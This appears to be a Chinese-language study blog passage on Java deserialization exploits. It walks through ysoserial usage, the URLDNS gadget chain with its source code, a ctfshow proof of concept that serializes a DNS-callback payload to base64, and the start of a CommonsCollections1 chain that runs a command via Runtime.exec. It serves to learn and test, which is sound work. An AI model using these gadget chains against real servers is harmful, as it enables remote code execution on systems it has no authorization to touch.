<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p>总结一下，从危害上来看，Python的反序列化危害是最大的；从应用广度上来看，Java的反序列化是最 常被用到的；从反序列化的原理上来看，PHP和Java是类似又不尽相同的。</p>
<h3 id="URLDNS-最简单的Gadget"><a href="#URLDNS-最简单的Gadget" class="headerlink" title="URLDNS-最简单的Gadget"></a>URLDNS-最简单的Gadget</h3><p>说在前面：</p>
<p><strong>ysoserial</strong>：可以让⽤户根据⾃⼰选择的利⽤链，⽣成反 序列化利⽤数据，通过将这些数据发送给⽬标，从⽽执⾏⽤户预先定义的命令。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利⽤链也叫“gadget chains”，我们通常称为gadget。如果你学过PHP反序列化漏洞，那么就可以将gadget理解为⼀种⽅法，它连接的是从触发位置开始到执⾏命令的位置结束，在PHP⾥可能</span><br><span class="line">是 __desctruct 到 eval ；如果你没学过其他语⾔的反序列化漏洞，那么gadget就是⼀种⽣成POC的⽅法罢了。</span><br></pre></td></tr></table></figure>

<p>ysoserial的使⽤也很简单，虽然我们暂时先不理解 CommonsCollections ，但是⽤ysoserial可以很容 易地⽣成这个gadget对应的POC：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">java -jar ysoserial-master-30099844c6-1.jar CommonsCollections1 &quot;id&quot;</span><br></pre></td></tr></table></figure>

<p>如上，ysoserial⼤部分的gadget的参数就是⼀条命令，⽐如这⾥是 id 。⽣成好的POC发送给⽬标，如 果⽬标存在反序列化漏洞，并满⾜这个gadget对应的条件，则命令 id 将被执⾏。</p>
<p>URLDNS 就是ysoserial中⼀个利⽤链的名字，但准确来说，这个其实不能称作“利⽤链”。因为其参数不 是⼀个可以“利⽤”的命令，⽽仅为⼀个URL，其能触发的结果也不是命令执⾏，⽽是⼀次DNS请求。 虽然这个“利⽤链”实际上是不能“利⽤”的，但因为其如下的优点，⾮常适合我们在检测反序列化漏洞时 使⽤： 使⽤Java内置的类构造，对第三⽅库没有依赖 在⽬标没有回显的时候，能够通过DNS请求得知是否存在反序列化漏洞.</p>
<p>可以在<a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java">ysoserial&#x2F;URLDNS.java at master · frohoff&#x2F;ysoserial (github.com)</a></p>
<p>看到下面的生成代码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> ysoserial.payloads;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Authors;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.Dependencies;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.annotation.PayloadTest;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.PayloadRunner;</span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * A blog post with more details about this gadget chain is at the url below:</span></span><br><span class="line"><span class="comment"> *   https://blog.paranoidsoftware.com/triggering-a-dns-lookup-using-java-deserialization/</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   This was inspired by  Philippe Arteau <span class="doctag">@h</span>3xstream, who wrote a blog</span></span><br><span class="line"><span class="comment"> *   posting describing how he modified the Java Commons Collections gadget</span></span><br><span class="line"><span class="comment"> *   in ysoserial to open a URL. This takes the same idea, but eliminates</span></span><br><span class="line"><span class="comment"> *   the dependency on Commons Collections and does a DNS lookup with just</span></span><br><span class="line"><span class="comment"> *   standard JDK classes.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The Java URL class has an interesting property on its equals and</span></span><br><span class="line"><span class="comment"> *   hashCode methods. The URL class will, as a side effect, do a DNS lookup</span></span><br><span class="line"><span class="comment"> *   during a comparison (either equals or hashCode).</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   As part of deserialization, HashMap calls hashCode on each key that it</span></span><br><span class="line"><span class="comment"> *   deserializes, so using a Java URL object as a serialized key allows</span></span><br><span class="line"><span class="comment"> *   it to trigger a DNS lookup.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   Gadget Chain:</span></span><br><span class="line"><span class="comment"> *     HashMap.readObject()</span></span><br><span class="line"><span class="comment"> *       HashMap.putVal()</span></span><br><span class="line"><span class="comment"> *         HashMap.hash()</span></span><br><span class="line"><span class="comment"> *           URL.hashCode()</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SuppressWarnings(&#123; &quot;rawtypes&quot;, &quot;unchecked&quot; &#125;)</span></span><br><span class="line"><span class="meta">@PayloadTest(skip = &quot;true&quot;)</span></span><br><span class="line"><span class="meta">@Dependencies()</span></span><br><span class="line"><span class="meta">@Authors(&#123; Authors.GEBL &#125;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> <span class="keyword">implements</span> <span class="title class_">ObjectPayload</span>&lt;Object&gt; &#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> Object <span class="title function_">getObject</span><span class="params">(<span class="keyword">final</span> String url)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//Avoid DNS resolution during payload creation</span></span><br><span class="line">                <span class="comment">//Since the field &lt;code&gt;java.net.URL.handler&lt;/code&gt; is transient, it will not be part of the serialized payload.</span></span><br><span class="line">                <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SilentURLStreamHandler</span>();</span><br><span class="line"></span><br><span class="line">                <span class="type">HashMap</span> <span class="variable">ht</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>(); <span class="comment">// HashMap that will contain the URL</span></span><br><span class="line">                <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler); <span class="comment">// URL to use as the Key</span></span><br><span class="line">                ht.put(u, url); <span class="comment">//The value can be anything that is Serializable, URL as the key is what triggers the DNS lookup.</span></span><br><span class="line"></span><br><span class="line">                Reflections.setFieldValue(u, <span class="string">&quot;hashCode&quot;</span>, -<span class="number">1</span>); <span class="comment">// During the put above, the URL&#x27;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.</span></span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> ht;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(<span class="keyword">final</span> String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                PayloadRunner.run(URLDNS.class, args);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/**</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;This instance of URLStreamHandler is used to avoid any DNS resolution while creating the URL instance.</span></span><br><span class="line"><span class="comment">         * DNS resolution is used for vulnerability detection. It is important not to probe the given URL prior</span></span><br><span class="line"><span class="comment">         * using the serialized object.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         *</span></span><br><span class="line"><span class="comment">         * &lt;b&gt;Potential false negative:&lt;/b&gt;</span></span><br><span class="line"><span class="comment">         * &lt;p&gt;If the DNS name is resolved first from the tester computer, the targeted server might get a cache hit on the</span></span><br><span class="line"><span class="comment">         * second resolution.&lt;/p&gt;</span></span><br><span class="line"><span class="comment">         */</span></span><br><span class="line">        <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">SilentURLStreamHandler</span> <span class="keyword">extends</span> <span class="title class_">URLStreamHandler</span> &#123;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">protected</span> <span class="keyword">synchronized</span> InetAddress <span class="title function_">getHostAddress</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>跟着ysoserial项目中URLDNS的Gadget来分析</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gadget Chain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">    HashMap.putVal()</span><br><span class="line">    HashMap.hash()</span><br><span class="line">    URL.hashCode()</span><br></pre></td></tr></table></figure>

<p>下面是一个demo</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://cc.tb9xxc.dnslog.cn&quot;</span>);</span><br><span class="line">        url.hashCode();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://cdn.jsdelivr.net/gh/realikun404/p1cg0_u4e/PicGo/image-20230322154213647.png" alt="image-20230322154213647"></p>
<p>可以看到成功执行了。</p>
<p>不知道为什么我在本地jdk11的代码运行不了完整的demo，但在云上jdk11可以执行，–illegal-access&#x3D;warn（添加的VM选项）。</p>
<p>先跟进<code>HashMap</code>，看看其自己实现的<code>readObject()</code>函数，这里通过<code>for</code>循环来将<code>HashMap</code>中存储的<code>key</code>通过<code>K key = (K) s.readObject();</code>来进行反序列化，在这之后调用<code>putVal()</code>和<code>hash()</code>函数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">readObject</span><span class="params">(ObjectInputStream s)</span></span><br><span class="line">       <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">       reinitialize();</span><br><span class="line"></span><br><span class="line">       ObjectInputStream.<span class="type">GetField</span> <span class="variable">fields</span> <span class="operator">=</span> s.readFields();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Read loadFactor (ignore threshold)</span></span><br><span class="line">       <span class="type">float</span> <span class="variable">lf</span> <span class="operator">=</span> fields.get(<span class="string">&quot;loadFactor&quot;</span>, <span class="number">0.75f</span>);</span><br><span class="line">       <span class="keyword">if</span> (lf &lt;= <span class="number">0</span> || Float.isNaN(lf))</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal load factor: &quot;</span> + lf);</span><br><span class="line"></span><br><span class="line">       lf = Math.min(Math.max(<span class="number">0.25f</span>, lf), <span class="number">4.0f</span>);</span><br><span class="line">       HashMap.UnsafeHolder.putLoadFactor(<span class="built_in">this</span>, lf);</span><br><span class="line"></span><br><span class="line">       s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">       <span class="type">int</span> <span class="variable">mappings</span> <span class="operator">=</span> s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">       <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">InvalidObjectException</span>(<span class="string">&quot;Illegal mappings count: &quot;</span> + mappings);</span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings == <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="comment">// use defaults</span></span><br><span class="line">       &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123;</span><br><span class="line">           <span class="type">float</span> <span class="variable">fc</span> <span class="operator">=</span> (<span class="type">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">           <span class="type">int</span> <span class="variable">cap</span> <span class="operator">=</span> ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                      DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                      (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                      MAXIMUM_CAPACITY :</span><br><span class="line">                      tableSizeFor((<span class="type">int</span>)fc));</span><br><span class="line">           <span class="type">float</span> <span class="variable">ft</span> <span class="operator">=</span> (<span class="type">float</span>)cap * lf;</span><br><span class="line">           threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                        (<span class="type">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">           <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">           <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">           SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">           <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">           Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> <span class="title class_">Node</span>[cap];</span><br><span class="line">           table = tab;</span><br><span class="line"></span><br><span class="line">           <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">           <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">               <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                   <span class="type">K</span> <span class="variable">key</span> <span class="operator">=</span> (K) s.readObject();</span><br><span class="line">               <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                   <span class="type">V</span> <span class="variable">value</span> <span class="operator">=</span> (V) s.readObject();</span><br><span class="line">               putVal(hash(key), key, value, <span class="literal">false</span>, <span class="literal">false</span>);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>跟进<code>hash()</code>函数看看是如何实现的，当<code>key!=null</code>时会调用<code>hashCode()</code>函数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span> <span class="title function_">hash</span><span class="params">(Object key)</span> &#123;</span><br><span class="line">    <span class="type">int</span> h;</span><br><span class="line">    <span class="keyword">return</span> (key == <span class="literal">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><code>URLDNS</code>是利用<code>URL</code>对象，于是跟进<code>Java</code>基本类<code>URL</code>中关于<code>hashCode()</code>的部分<code>java/net/URL.java</code>，由于我们可以设置<code>hashCode</code>的值默认为<code>-1</code>，因此会执行<code>hashCode = handler.hashCode(this)</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">public synchronized int hashCode() &#123;</span><br><span class="line">    if (hashCode != -1)</span><br><span class="line">        return hashCode;</span><br><span class="line"></span><br><span class="line">    hashCode = handler.hashCode(this);</span><br><span class="line">    return hashCode;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>下面是handler.hashCode()代码：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">hashCode</span><span class="params">(URL u)</span> &#123;</span><br><span class="line">       <span class="type">int</span> <span class="variable">h</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the protocol part.</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">protocol</span> <span class="operator">=</span> u.getProtocol();</span><br><span class="line">       <span class="keyword">if</span> (protocol != <span class="literal">null</span>)</span><br><span class="line">           h += protocol.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the host part.</span></span><br><span class="line">       <span class="type">InetAddress</span> <span class="variable">addr</span> <span class="operator">=</span> getHostAddress(u);</span><br><span class="line">       <span class="keyword">if</span> (addr != <span class="literal">null</span>) &#123;</span><br><span class="line">           h += addr.hashCode();</span><br><span class="line">       &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">           <span class="type">String</span> <span class="variable">host</span> <span class="operator">=</span> u.getHost();</span><br><span class="line">           <span class="keyword">if</span> (host != <span class="literal">null</span>)</span><br><span class="line">               h += host.toLowerCase().hashCode();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the file part.</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">file</span> <span class="operator">=</span> u.getFile();</span><br><span class="line">       <span class="keyword">if</span> (file != <span class="literal">null</span>)</span><br><span class="line">           h += file.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the port part.</span></span><br><span class="line">       <span class="keyword">if</span> (u.getPort() == -<span class="number">1</span>)</span><br><span class="line">           h += getDefaultPort();</span><br><span class="line">       <span class="keyword">else</span></span><br><span class="line">           h += u.getPort();</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Generate the ref part.</span></span><br><span class="line">       <span class="type">String</span> <span class="variable">ref</span> <span class="operator">=</span> u.getRef();</span><br><span class="line">       <span class="keyword">if</span> (ref != <span class="literal">null</span>)</span><br><span class="line">           h += ref.hashCode();</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> h;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到这里调用了一个函数<code>getHostAddress()</code>来进行<code>DNS</code>解析返回对应的<code>IP</code>。</p>
<p>即进行了DNS查询。</p>
<p>做做ctfshow的DNSURL题目。</p>
<p>这是网上的POC，我们根据代码看看我们需要分析些什么：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.net.URLConnection;</span><br><span class="line"><span class="keyword">import</span> java.net.URLStreamHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test2</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">URLStreamHandler</span> <span class="variable">handler</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLStreamHandler</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">protected</span> URLConnection <span class="title function_">openConnection</span><span class="params">(URL u)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;http://xkesxe.dnslog.cn&quot;</span>;</span><br><span class="line">        <span class="type">URL</span> <span class="variable">u</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="literal">null</span>, url, handler);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">code</span> <span class="operator">=</span> u.getClass().getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        code.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        code.set(u, -<span class="number">1</span>);</span><br><span class="line">        map.put(u, url);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">stream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;test.data&quot;</span>));</span><br><span class="line">        stream.writeObject(map);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">stream1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;test.data&quot;</span>));</span><br><span class="line">        stream1.readObject();</span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64Serializer.serializeToBase64(map);</span><br><span class="line">        System.out.println(base64String);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里要注意的是URL实例u的hashcode不是-1，而是经过计算成为其他的值了。</p>
<p>所以要进行修改，而hashcode为private，所以需要code.setAccessible(true);</p>
<p><a href="https://cloud.tencent.com/developer/article/1015078">深入理解 Java 反射：Field （成员变量） - 腾讯云开发者社区-腾讯云 (tencent.com)</a></p>
<p><a href="https://github.com/bfengj/CTF/blob/main/Web/java/Java%E5%9F%BA%E7%A1%80/Java-%E5%BA%8F%E5%88%97%E5%8C%96%E5%92%8C%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0.md">CTF&#x2F;Java-序列化和反序列化-学习笔记.md at main · bfengj&#x2F;CTF (github.com)</a></p>
<p>Field来自java.lang.reflect.Field，很明显其跟反射有关。具体看上面链接。</p>
<p>下面是chatgPT问的一个base64序列化类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Base64Serializer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Serializable</span>&gt; String <span class="title function_">serializeToBase64</span><span class="params">(T object)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(byteArrayOutputStream);</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">        <span class="keyword">return</span> Base64.getEncoder().encodeToString(byteArrayOutputStream.toByteArray());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> &lt;T <span class="keyword">extends</span> <span class="title class_">Serializable</span>&gt; T <span class="title function_">deserializeFromBase64</span><span class="params">(String base64String)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class="line">        <span class="type">byte</span>[] bytes = Base64.getDecoder().decode(base64String);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">byteArrayInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(bytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">objectInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(byteArrayInputStream);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">        <span class="type">T</span> <span class="variable">object</span> <span class="operator">=</span> (T) objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        <span class="keyword">return</span> object;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后是main</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">Person</span> <span class="variable">person</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Person</span>(<span class="string">&quot;John Doe&quot;</span>, <span class="number">30</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64Serializer.serializeToBase64(person);</span><br><span class="line">            System.out.println(<span class="string">&quot;Serialized Base64 string: &quot;</span> + base64String);</span><br><span class="line"></span><br><span class="line">            <span class="type">Person</span> <span class="variable">deserializedPerson</span> <span class="operator">=</span> Base64Serializer.deserializeFromBase64(base64String);</span><br><span class="line">            System.out.println(<span class="string">&quot;Deserialized Person object: &quot;</span> + deserializedPerson);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException | ClassNotFoundException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="CC1"><a href="#CC1" class="headerlink" title="CC1"></a>CC1</h2><h3 id="简化的CC1链子"><a href="#简化的CC1链子" class="headerlink" title="简化的CC1链子"></a>简化的CC1链子</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> org.example;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CommonCollections1</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> <span class="title class_">Transformer</span>[]&#123;</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ConstantTransformer</span>(Runtime.getRuntime()),</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">InvokerTransformer</span>(<span class="string">&quot;exec&quot;</span>, <span class="keyword">new</span> <span class="title class_">Class</span>[]&#123;String.class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> <span class="title class_">Object</span>[]</span><br><span class="line">                                &#123;<span class="string">&quot;calc&quot;</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">Transformer</span> <span class="variable">transformerChain</span> <span class="operator">=</span> <span class="keyword">new</span></span><br><span class="line">                <span class="title class_">ChainedTransformer</span>(transformers);</span><br><span class="line">        <span class="type">Map</span> <span class="variable">innerMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        <span class="type">Map</span> <span class="variable">outerMap</span> <span class="operator">=</span> TransformedMap.decorate(innerMap, <span class="literal">null</span>,</span><br><span class="line">                transformerChain);</span><br><span class="line">        outerMap.put(<span class="string">&quot;test&quot;</span>, <span class="string">&quot;xxxx&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>发现能够运行，接kan下来我们需要理解其为什么能运行（看类的源码）、以及找条会调用readObject的类（之后再说）。</p>
<p>下面分析一下设计到的接口和类：</p>
<h4 id="TransformedMap"><a href="#TransformedMap" class="headerlink" title="TransformedMap"></a><strong>TransformedMap</strong></h4><p>TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可 以执⾏⼀个回调。我们通过下⾯这⾏代码对innerMap进⾏修饰，传出的outerMap即是修饰后的Map：</p>
